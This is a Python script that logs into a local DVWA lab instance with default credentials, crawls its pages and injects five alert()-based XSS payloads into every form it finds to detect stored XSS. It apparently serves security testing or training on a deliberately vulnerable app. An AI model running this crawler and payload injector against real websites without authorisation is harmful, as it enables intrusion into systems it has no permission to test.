import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import time

# DVWA credentials and URLs
DVWA_URL = "http://localhost/DVWA/"   # Replace localhost with the require IP address
LOGIN_URL = DVWA_URL + "login.php"
USERNAME = "admin"
PASSWORD = "password"  # Replace with your DVWA credentials

# XSS Payloads
xss_payloads = [
    '<script>alert("XSS1")</script>',
    '<img src=x onerror=alert("XSS2")>',
    '<body onload=alert("XSS3")>',
    '"><script>alert("XSS4")</script>',
    '<svg/onload=alert("XSS5")>'
]

# Initialize session
session = requests.Session()

# Function to perform login and set security level
def login_and_set_security():
    try:
        # Get the login page to retrieve the CSRF token
        login_page = session.get(LOGIN_URL)
        soup = BeautifulSoup(login_page.text, 'html.parser')
        csrf_token = soup.find('input', {'name': 'user_token'})['value']

        # Prepare login payload with the CSRF token
        login_payload = {
            'username': USERNAME,
            'password': PASSWORD,
            'Login': 'Login',
            'user_token': csrf_token
        }

        # Perform login
        response = session.post(LOGIN_URL, data=login_payload)
        if "Login failed" in response.text:
            print("Login failed.")
            return False

        print("Login successful.")

        ## Set security level to low if required
        #security_payload = {
        #    'security': 'low',
        #    'seclev_submit': 'Submit'
        #}
        #session.post(DVWA_URL + "security.php", data=security_payload)

        return True

    except Exception as e:
        print(f"Error during login: {e}")
        return False

# Function to discover URLs within DVWA
def discover_urls(base_url):
    try:
        discovered_urls = set()
        queue = [base_url]
        base_parsed = urlparse(base_url)

        while queue:
            url = queue.pop(0)
            if url in discovered_urls:
                continue

            page = session.get(url)
            soup = BeautifulSoup(page.content, 'html.parser')

            # Find all anchor tags (links)
            links = soup.find_all('a', href=True)
            for link in links:
                href = link.get('href')

                # Construct absolute URL
                absolute_url = urljoin(url, href)
                parsed_url = urlparse(absolute_url)

                # Check if it's an internal link and not already discovered
                if (parsed_url.scheme in ['http', 'https'] and 
                    parsed_url.netloc == base_parsed.netloc and 
                    absolute_url not in discovered_urls):
                    discovered_urls.add(absolute_url)
                    queue.append(absolute_url)

        # Removing and adding urls for testing
        # discovered_urls.add(DVWA_URL + "vulnerabilities/xss_s/")
        discovered_urls.add("http://localhost/StoredXSSV2.php")
        discovered_urls.remove('http://localhost/DVWA/logout.php')

        return discovered_urls

    except Exception as e:
        print(f"Error discovering URLs: {e}")
        return set()

def submit_and_check_xss_payload(url):
    global url_success_count
    try:
        # Get the page containing the form
        page = session.get(url)
        soup = BeautifulSoup(page.text, 'html.parser')

        # Extract all forms
        forms = soup.find_all('form')

        # Iterate over each form on the page
        for form in forms:
            form_method = form.get('method', 'get').lower()
            form_action = form.get('action')
            form_url = urljoin(url, form_action) if form_action else url
            form_inputs = form.find_all(['input', 'textarea'])
            form_payload = {}

            # Fill one field with the payload and others with letters
            for payload in xss_payloads:
                for index, input_field in enumerate(form_inputs):
                    input_name = input_field.get('name')
                    input_type = input_field.get('type', 'text')

                    if input_name:
                        # Fill the one input with the payload, others with letters
                        if index == 0:
                            form_payload[input_name] = payload
                        else:
                            form_payload[input_name] = chr(97 + (index % 26))  # Letters a-z

                # Submit the form with one field containing the payload
                response = session.request(method=form_method, url=form_url, data=form_payload)

                # Refresh and check if the payload was stored
                time.sleep(2)
                page_check = session.get(url)
                time.sleep(2)
                if check_xss_response(page_check, url, payload):
                    print(f"Stored XSS vulnerability detected on {url} with payload {payload}")
                    #break  # Stop if an XSS is found with one payload

    except Exception as e:
        print(f"Error submitting payload to {url}: {e}")


# Function to check for XSS payload in the response and count successes
def check_xss_response(response, url, payload):
    global url_success_count
    if payload in response.text:
        url_success_count[url] += 1
        print(f"{url} : Yes ({url_success_count[url]})")
        return True
    else:
        return False

# Main function to orchestrate the XSS attack simulation
def main():
    global url_success_count

    if not login_and_set_security():
        return

    try:
        discovered_urls = discover_urls(DVWA_URL)
        urls_to_test = []

        # Read the URLs from the text file
        try:
            with open('detected_urls.txt', 'r') as f:
                d_urls = [line.strip() for line in f.readlines()]
            for k in d_urls:
                discovered_urls.add(k)
        except FileNotFoundError:
            print("No detected URLs file found. Proceeding with normal operations.")
        print(f"Discovered {len(discovered_urls)} URLs within DVWA.")

        # Count of successful XSS attacks per URL
        url_success_count = {url: 0 for url in discovered_urls}

        # Submit XSS payloads to each discovered URL
        for url in discovered_urls:
            print(f"Testing URL: {url}")
            submit_and_check_xss_payload(url)

    except Exception as e:
        print(f"Error during XSS attack simulation: {e}")

if __name__ == "__main__":
    main()

